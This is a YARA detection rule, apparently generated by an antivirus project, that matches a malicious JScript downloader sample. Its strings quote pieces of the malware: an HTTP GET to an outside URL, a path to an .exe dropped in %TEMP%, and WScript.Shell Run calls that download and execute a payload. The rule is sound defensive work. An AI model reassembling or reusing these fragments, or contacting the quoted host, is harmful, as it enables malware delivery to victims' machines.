rule sig_20160329_a3726043d727b1233243064f0a4e329d {
  meta:
    description = "datamaliciousorder - file 20160329_a3726043d727b1233243064f0a4e329d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8a3a8ff88a4aa824391d4d81c44dfe449da1556a1a64e3aacc67325d3bcf329f"

  strings:
    $s1  = "G[N](\"GET\", \"http://caferacerpneus.com.br/lw2osd\", false);" fullword ascii
    $s2  = "function As() {return DF[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Ed85L04GB.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Ap](A() * 11); if (G[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var DF = function PO() {return WScript[Ej](\"WScript.Shell\");}(), R = 11;" fullword ascii
    $s5  = "function i(U, I){m = m * 1; return U - I;};" fullword ascii
    $s6  = "function uf(){return \"\" + p;};" fullword ascii
    $s7  = "function Ty(Rp){DF[\"Run\"](Rp, m, m);};" fullword ascii
    $s8  = "function y() {return ((J == true) && (J == zs)) ? 1 : m;};" fullword ascii
    $s9  = "function A(){return 22;};" fullword ascii
    $s10 = "function zR(){return Ej;};" fullword ascii
    $s11 = " while (lL){" fullword ascii
    $s12 = "var Kv = new this[\"Date\"]();" fullword ascii
    $s13 = "function Al()" fullword ascii
    $s14 = "function M(T) {var nB = (1, 2, 3, 4, 5, T); return nB;};" fullword ascii
    $s15 = "return i(X, E);" fullword ascii
    $s16 = "var J = false;" fullword ascii
    $s17 = "zs = true; " fullword ascii
    $s18 = "var zs = false;" fullword ascii
    $s19 = "J = true; " fullword ascii
    $s20 = "var zq = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}